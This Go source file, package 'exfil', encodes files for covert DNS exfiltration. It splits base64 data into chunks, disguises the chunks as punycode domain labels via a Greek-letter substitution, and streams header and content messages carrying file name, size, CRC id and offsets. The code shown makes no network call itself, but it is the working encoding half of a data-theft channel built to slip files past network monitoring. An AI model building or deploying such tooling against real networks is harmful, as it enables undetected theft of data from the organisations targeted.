package exfil

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"hash/crc32"
	"io"
	"os"
	"path"
	"strconv"
	"strings"

	"golang.org/x/net/idna"
)

var (
	Encoding = base64.StdEncoding.WithPadding(base64.NoPadding)
	Mapping  = map[rune]rune{
		'A': 'α', 'B': 'β', 'C': 'π', 'D': 'δ', 'E': 'ε', 'F': 'ϝ',
		'G': 'γ', 'H': 'σ', 'I': 'ι', 'J': 'φ', 'K': 'κ', 'L': 'λ',
		'M': 'χ', 'N': 'ν', 'O': 'ο', 'P': 'θ', 'Q': 'ψ', 'R': 'ρ',
		'S': 'ς', 'T': 'τ', 'U': 'μ', 'V': 'ω', 'W': 'Ϟ', 'X': 'ξ',
		'Y': 'υ', 'Z': 'ζ', '+': 'ƕ', '/': 'η',
	}
)

const partLength = 24

func Encode(data []byte) string {
	buf := bytes.NewBuffer(nil)
	b64w := base64.NewEncoder(Encoding, buf)
	//b32w := base32.NewEncoder(base32.StdEncoding, buf)
	//compressor, _ := zlib.NewWriterLevel(b32w, zlib.BestCompression)
	//compressor.Write(data)
	//compressor.Close()
	b64w.Write(data)
	b64w.Close()

	s := buf.String()
	parts := make([]string, (len(s)/partLength)+1)
	for i := range parts {
		start := i * partLength
		end := start + partLength
		if end > len(s) {
			end = len(s)
		}
		part := s[start:end]
		part = strings.Map(func(r rune) rune {
			if rr, ok := Mapping[r]; ok {
				return rr
			}
			return r
		}, part)
		parts[i], _ = idna.ToASCII(part)
	}

	encoded := strings.TrimRight(strings.Join(parts, "."), ".")
	return encoded + ".l" + strconv.Itoa(len(encoded))
}

const blockSize = 64

func GenHeaderMsg(id uint32, name string, size uint32) (string, error) {
	id = id | 0x80000000
	buf := bytes.NewBuffer(nil)
	err := binary.Write(buf, binary.BigEndian, id)
	if err != nil {
		return "", err
	}
	err = binary.Write(buf, binary.BigEndian, size)
	if err != nil {
		return "", err
	}
	_, err = buf.WriteString(name)
	if err != nil {
		return "", err
	}
	return Encode(buf.Bytes()), nil
}

func GenContentMsg(id uint32, offset uint32, data []byte) (string, error) {
	id = id & 0x7fffffff
	buf := bytes.NewBuffer(nil)
	err := binary.Write(buf, binary.BigEndian, id)
	if err != nil {
		return "", err
	}
	err = binary.Write(buf, binary.BigEndian, offset)
	if err != nil {
		return "", err
	}
	_, err = buf.Write(data)
	if err != nil {
		return "", err
	}
	return Encode(buf.Bytes()), nil
}

func EncodeFile(filePath string) (chan string, error) {
	s, err := os.Stat(filePath)
	if err != nil {
		return nil, err
	}
	bn := path.Base(filePath)
	sz := s.Size()
	if sz > 0xffffffff {
		return nil, errors.New("File to large")
	}
	f, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	crc := crc32.NewIEEE()
	io.Copy(crc, f)
	f.Seek(0, os.SEEK_SET)

	return EncodeFileContent(crc.Sum32(), bn, uint32(sz), f), nil
}

func EncodeFileContent(id uint32, name string, size uint32, data io.ReadCloser) chan string {
	c := make(chan string)
	go func(c chan<- string, id, size uint32, data io.ReadCloser) {
		defer close(c)
		defer data.Close()

		msg, err := GenHeaderMsg(id, name, size)
		if err != nil {
			panic(err)
			return
		}

		c <- msg

		var i uint32
		var block = make([]byte, blockSize)
		for i = 0; i < size; i += blockSize {
			n, err := data.Read(block)
			if err != nil {
				panic(err)
				return
			}

			msg, err := GenContentMsg(id, i, block[0:n])
			if err != nil {
				panic(err)
				return
			}

			c <- msg
		}
	}(c, id, size, data)
	return c
}
